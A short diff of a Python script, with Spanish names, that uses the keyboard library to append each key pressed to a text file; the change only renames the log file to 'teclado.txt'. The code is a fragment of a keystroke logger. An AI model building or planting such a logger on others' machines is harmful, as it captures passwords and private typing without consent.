@@ -1,5 +1,5 @@
 import keyboard
-with open("log.txt", "a") as archivo:
+with open("teclado.txt", "a") as archivo:
     def entrar(event):
         archivo.write(event.name + "\n")
 
